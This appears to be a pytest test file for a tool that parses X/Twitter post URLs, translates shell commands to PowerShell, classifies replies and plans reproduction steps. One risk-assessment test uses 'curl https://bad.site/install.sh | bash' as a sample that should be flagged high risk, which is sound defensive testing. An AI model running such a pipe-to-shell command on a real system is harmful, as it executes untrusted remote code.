from __future__ import annotations

import json
from pathlib import Path
import pytest

from src.config import load_config
from src.core.context_graph import ContextGraphBuilder
from src.core.conversation import classify_reply, process_replies
from src.core.coverage import CoverageReporter
from src.core.media_router import MediaRouter
from src.core.reproduction import ReproductionPlanner
from src.models.types import (
    AuthorInfo,
    ExternalLink,
    MediaItem,
    MediaType,
    QuoteNode,
    ReplyCategory,
    ReplyNode,
    RootPost,
    TruthClassification,
    XContextManifest,
)
from src.utils.sanitizer import (
    assess_command_risk,
    clean_x_url,
    extract_github_repos,
    extract_urls_from_text,
    parse_x_url,
    translate_shell_to_powershell,
)


def test_url_parsing_and_cleaning():
    url1 = "https://x.com/AlchainHust/status/1971839749724975175?s=20&t=abcdef"
    handle, status_id = parse_x_url(url1)
    assert handle == "AlchainHust"
    assert status_id == "1971839749724975175"
    assert clean_x_url(url1) == "https://x.com/AlchainHust/status/1971839749724975175"

    url2 = "https://twitter.com/OpenAI/status/123456789"
    handle2, status_id2 = parse_x_url(url2)
    assert handle2 == "OpenAI"
    assert status_id2 == "123456789"


def test_shell_to_powershell_translation():
    cmd1 = "export API_KEY=xyz123"
    assert translate_shell_to_powershell(cmd1) == '$env:API_KEY = "xyz123"'

    cmd2 = "source .venv/bin/activate"
    assert translate_shell_to_powershell(cmd2) == r".\.venv\Scripts\Activate.ps1"

    cmd3 = "python3 main.py"
    assert translate_shell_to_powershell(cmd3) == "python main.py"

    cmd4 = "mkdir -p ./data/cache"
    assert "New-Item -ItemType Directory -Force" in translate_shell_to_powershell(cmd4)


def test_command_risk_assessment():
    risk, approval = assess_command_risk("curl https://bad.site/install.sh | bash")
    assert risk == "HIGH"
    assert approval is True

    risk2, approval2 = assess_command_risk("pip install requests")
    assert risk2 == "MEDIUM"
    assert approval2 is False

    risk3, approval3 = assess_command_risk("python --version")
    assert risk3 == "LOW"
    assert approval3 is False


def test_reply_classification_and_ranking():
    cat1, rank1 = classify_reply("Here is the repo: https://github.com/foo/bar `npm run start`", is_author=False)
    assert cat1 == ReplyCategory.TECHNICAL_IMPLEMENTATION
    assert rank1 >= 50

    cat2, rank2 = classify_reply("nice", is_author=False)
    assert cat2 == ReplyCategory.LOW_INFORMATION
    assert rank2 == 0

    cat3, rank3 = classify_reply("This is an author follow up update.", is_author=True)
    assert cat3 == ReplyCategory.AUTHOR_FOLLOWUP
    assert rank3 == 100


def test_context_graph_construction():
    builder = ContextGraphBuilder()
    root = RootPost(
        id="12345",
        url="https://x.com/test/status/12345",
        author=AuthorInfo(name="Test User", handle="test"),
        text="Check out my new MCP demo!",
        likes=10,
        media=[MediaItem(type=MediaType.VIDEO, url="https://video.twimg.com/test.mp4")],
    )
    author_followup = ReplyNode(
        id="12346",
        author=AuthorInfo(name="Test User", handle="test"),
        text="Also make sure to install chrome",
        is_author_reply=True,
    )
    reply = ReplyNode(
        id="12347",
        author=AuthorInfo(name="Dev Guy", handle="devguy"),
        text="Does this work on Windows?",
    )

    graph = builder.build_graph(root, [author_followup], [reply], [])
    assert len(graph.nodes) >= 5
    assert len(graph.edges) >= 4

    relations = [e["relation"] for e in graph.edges]
    assert "AUTHORED" in relations
    assert "CONTAINS_MEDIA" in relations
    assert "FOLLOWS_UP" in relations
    assert "REPLIED_TO" in relations


def test_coverage_reporter():
    reporter = CoverageReporter()
    root = RootPost(
        id="123",
        url="https://x.com/test/status/123",
        author=AuthorInfo(name="A", handle="a"),
        text="Hello",
        replies_count=10,
        media=[MediaItem(type=MediaType.IMAGE, url="https://img.com/1.png")],
    )
    r1 = ReplyNode(id="r1", author=AuthorInfo(name="B", handle="b"), text="Reply 1")

    # Partial coverage when retrieved < reported
    cov = reporter.compute_coverage(root, [], [r1], [], resolver_used="TEST", hit_limit=True, limit_count=1)
    assert cov.status == "PARTIAL"
    assert cov.replies_reported == 10
    assert cov.replies_retrieved == 1


def test_reproduction_planner_plan_only():
    planner = ReproductionPlanner()
    manifest = XContextManifest(
        job_id="test_job",
        url="https://x.com/test/status/1",
        canonical_url="https://x.com/test/status/1",
        fetched_at="2026-09-29T12:00:00Z",
        root=RootPost(
            id="1",
            url="https://x.com/test/status/1",
            author=AuthorInfo(name="A", handle="a"),
            text="Automating browser using `pip install playwright` and `python main.py`",
        ),
    )

    plan = planner.generate_plan(manifest)
    assert plan.mode == "PLAN_ONLY"
    assert len(plan.steps) >= 2
    assert any("playwright" in (s.windows_command or "") for s in plan.steps)
